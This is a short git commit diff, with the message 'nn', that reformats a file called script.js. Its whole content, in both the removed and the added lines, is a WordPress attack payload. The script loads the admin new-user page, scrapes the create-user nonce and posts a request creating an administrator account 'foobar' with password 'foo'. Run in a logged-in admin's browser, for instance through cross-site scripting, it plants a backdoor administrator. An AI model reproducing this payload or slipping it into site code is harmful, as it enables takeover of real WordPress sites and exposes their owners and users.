abcdd888e656db52e9b560170b97959bf3a30548
dikshitkhandelwal <dikshitkhandelwal1@gmail.com>
2024-03-03 11:41:25 -0500

    nn

--- script.js
+++ script.js
@@ -1,3 +1,12 @@
-u="/wp-admin/user-new.php";jQuery.get(u, function(e)
-{jQuery.post(u, {action:"createuser", "_wpnonce_create-
-user":e.match(/_wpnonce_create-user\"\svalue=)"(.+?)\"/)[1],user_login:"foobar",email:"foobar@bar.com",pass1:"foo",pass2:"foo",role:"administrator"})});
+u = "/wp-admin/user-new.php";
+jQuery.get(u, function(e) {
+    jQuery.post(u, {
+        action: "createuser",
+        "_wpnonce_create-user": e.match(/_wpnonce_create-user"\svalue="(.+?)"/)[1],
+        user_login: "foobar",
+        email: "foobar@bar.com",
+        pass1: "foo",
+        pass2: "foo",
+        role: "administrator"
+    });
+});
